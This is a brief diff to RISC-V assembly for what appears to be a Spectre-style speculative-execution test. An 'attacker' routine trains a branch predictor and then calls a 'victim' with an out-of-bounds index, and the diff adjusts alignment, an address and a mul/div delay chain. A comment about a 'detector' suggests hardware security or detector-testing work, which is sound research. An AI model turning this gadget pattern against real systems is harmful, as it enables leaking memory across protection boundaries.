@@ -20,15 +20,16 @@
 .text
 attacker:
   li  a0, 0
-  nop     # HACK: align code for the detector.
 
   # Training: call the victim with a0 = 0.
   .rept N_TRAINING_ROUNDS
+  .align 4
   call victim
   .endr
 
   # Speculation: call the victim with out-of-bounds index.
   li  a0, OOB_IDX
+  .align 4
   call victim
 
   .align 4
@@ -44,7 +45,7 @@ victim:
   # Calculate address of arr[a0].
 
 #ifdef NO_DATA
-  li t0, 0x80001000
+  li t0, 0x80006000
 #else
   lla t0, arr
 #endif
@@ -52,6 +53,8 @@ victim:
 
   # Slow down branch with mul/div by a non-power-of-two.
   li t1, NON_POWER_OF_2
+  mul a0, a0, t1
+  div a0, a0, t1
   mul a0, a0, t1
   div a0, a0, t1
   mul a0, a0, t1
